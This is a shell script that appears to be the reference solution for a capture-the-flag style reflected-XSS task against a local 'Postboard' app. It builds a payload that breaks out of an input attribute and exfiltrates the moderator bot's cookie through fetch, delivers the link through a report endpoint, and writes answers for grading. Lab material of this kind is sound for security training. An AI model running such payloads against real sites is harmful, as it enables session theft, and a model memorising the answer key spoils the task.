# Reference solution for reflected-xss. Runs as root inside the container.
#
# The /search page reflects ?q= inside an attribute:  <input ... value="Q">.
# A bare <script> placed there is inert (it's just text inside the quotes), so we
# first break out of the attribute with  ">  and THEN open a real <script> tag.
# The script reads the moderator's cookie and sends it to /xss-hit, which makes
# the server write the flag.
#
# Note the payload uses a backtick template literal `/xss-hit?c=${document.cookie}`
# instead of  "..."+document.cookie : in a URL a '+' decodes to a space and would
# break the script. Template literals carry no '+'.
set -euo pipefail

PAYLOAD='"><script>fetch(`/xss-hit?c=${document.cookie}`)</script>'

# Wait for the Postboard app to come up (it is the container's main process and
# may still be starting right after a reset).
for _ in $(seq 1 40); do
  curl -sf -o /dev/null 'http://127.0.0.1:8080/' && break
  sleep 0.5
done

# Deliver it: report a crafted search link to the moderator bot, which opens it
# in a logged-in browser and runs the reflected script.
curl -s -G 'http://127.0.0.1:8080/report' \
  --data-urlencode "path=/search?q=${PAYLOAD}" >/dev/null

# Give the bot's asynchronous callback time to land.
sleep 2

# Record findings for the recon checks.
cat > /root/answers.txt <<EOF
CONTEXT=attribute
BREAKOUT=">
PAYLOAD=${PAYLOAD}
EOF
